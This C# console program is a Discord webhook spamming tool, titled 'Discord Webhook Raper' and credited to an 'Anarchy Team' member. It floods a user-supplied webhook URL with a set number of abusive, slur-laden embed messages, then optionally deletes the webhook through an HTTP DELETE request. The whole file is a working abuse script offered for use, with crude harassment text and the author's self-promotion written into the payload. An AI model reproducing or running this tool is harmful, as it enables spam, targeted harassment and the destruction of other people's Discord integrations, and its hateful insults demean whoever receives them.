using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Colorful;
using Leaf.xNet;
using System.Threading;
using System.Drawing;
using System.Threading.Tasks;

namespace DiscordWebhook_Raper
{
	class Program
	{

		public static int MSGSENT = 0;
		static void Main(string[] args)
		{
			Colorful.Console.Title = "BabiKoqi's Discord Webhook Raper - [Anarchy Team]";
			Colorful.Console.Write(@"

                    ▄ ▄   ▄███▄   ███    ▄  █ ████▄ ████▄ █  █▀     █▄▄▄▄ ██   █ ▄▄  ▄███▄   █▄▄▄▄ 
                   █   █  █▀   ▀  █  █  █   █ █   █ █   █ █▄█       █  ▄▀ █ █  █   █ █▀   ▀  █  ▄▀ 
                  █ ▄   █ ██▄▄    █ ▀ ▄ ██▀▀█ █   █ █   █ █▀▄       █▀▀▌  █▄▄█ █▀▀▀  ██▄▄    █▀▀▌  
                  █  █  █ █▄   ▄▀ █  ▄▀ █   █ ▀████ ▀████ █  █      █  █  █  █ █     █▄   ▄▀ █  █  
                   █ █ █  ▀███▀   ███      █                █         █      █  █    ▀███▀     █   
                    ▀ ▀                   ▀                ▀         ▀      █    ▀            ▀    
                                                                          ▀                       


", Color.Purple);

			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write(@"Do You Want To Delete The WebHook After The SPAM?", Color.White);
			Colorful.Console.Write("\n[", Color.White);
			Colorful.Console.Write("1", Color.Purple);
			Colorful.Console.Write("] Yes", Color.White);
			Colorful.Console.Write("\n[", Color.White);
			Colorful.Console.Write("2", Color.Purple);
			Colorful.Console.Write("] No", Color.White);
			Colorful.Console.Write("\n[", Color.White);
			Colorful.Console.Write("input", Color.Purple);
			Colorful.Console.Write("]: ", Color.White);
			int delete = Convert.ToInt32(Colorful.Console.ReadLine());

			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("What Webhook Do You Want To Rape: ", Color.White);
			string hook = Colorful.Console.ReadLine();
			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("How Many Times Do You Want To Send The Message: ", Color.White);
			int times = Convert.ToInt32(Colorful.Console.ReadLine());
			Colorful.Console.Write(DateTime.Now.ToString("\n\n[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("Starting To Rape The Webhook...\n\n", Color.White);

			bool working = true;

			Task.Factory.StartNew(delegate ()
			{
				while (working)
			    {
					Colorful.Console.Title = $"BabiKoqi's Discord Webhook Raper - Msgs Sent:[{MSGSENT}] - [Anarchy Team]";
				}
			});

			for (int i = 0; i < times; i++)
			{
				try
				{
					using (HttpRequest req = new HttpRequest())
					{
						string request = req.Post(hook, "{\"username\":\"BabiKoqi's Slave\",\"embeds\":[{\"title\":\"You Got Fucked By BabiKoqi!! Enjoy⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\",\"description\": \"You Just Got Fucked By One Of AnarchyTeam Members, How Do You Feel? Well U Should Start To Cry Now U Gay Bitch\",\"type\":\"rich\",\"color\":\"4194432\",\"footer\":{\"text\":\"Enjoy These Spams By BabiKoqi!!\"},\"author\":{\"name\":\"BabiKoqi\",\"icon_url\":\"https://i.imgur.com/Y81Ia57.jpg\",\"url\":\"https://cracked.to/member.php?action=profile&uid=118633\"}}]}", "application/json").ToString();
						Thread.Sleep(35);
					}
				}
				catch
				{

				}
				MSGSENT++;
				Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
				Colorful.Console.WriteLine($"Message Number [{MSGSENT}] Was Sent.", Color.White);
			}
			if (delete == 1)
			{
				string deletehook = new HttpRequest().Delete(hook).ToString();
				Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
				Colorful.Console.Write("The WebHook Got Deleted.\n\n", Color.White);
			}
			Colorful.Console.Write("\n\n");
			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("Program Finished Its Work...");
			Colorful.Console.ReadLine();

		}
	}
}
